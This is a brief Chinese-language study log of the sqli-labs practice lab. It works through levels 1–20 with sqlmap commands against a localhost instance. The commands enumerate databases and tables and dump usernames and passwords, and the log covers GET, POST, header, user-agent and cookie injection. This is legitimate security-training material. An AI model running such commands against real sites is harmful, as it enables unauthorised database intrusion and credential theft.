```
写在最前：基本上就全用sqlmap，手动注入搞懂原理就ok了，所以说写的比较草率，btw这个新版本php要让我把所有sql函数改成sqli的才能运行。神
```


# Less1
提示输入id、数字

打开powershell,cd
```
python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --batch
```
确定是单引号字符注入，按照流程来

```
 python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --dbs --batch
 python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" -D security --tables --batch
 python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" -D security -T users --columns --batch

  python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" -D security -T users -C "username,password" --dump --batch
```

***done***

# Less2-10

貌似都是一样的get注入


# Less11-17
看到了不一样的，这里有两个表单了，~~于是我们打开burps..~~，随便输入几个数值，然后换特殊字符，发现报错。于是应该是post注入

检查页面源码，发现post应该是三元素：uname和passwd，以及submit

直接开爆

```
python sqlmap.py -u "http://localhost/sqli-labs-master/Less-11/" --data "uname=1&passwd=1&submit=Submit" --batch
```

果然是一个post类型，接下来又是爆所有库，找security，爆表找user，爆列，和上述一样，不再赘述。


其他都是一样的，唯一需要注意的是less17要调高一下risk

# less 18

发现记录了我的ip，观察代码，发现user-agent这一块，有个传参和拼接，注意到注入点应该在这里


~~但是我搞了半天都没修好，这道题没办法掠过算了。。。~~

# less 19-20

抓包改head，看cookie，然后照常使用sqlmap直接爆破

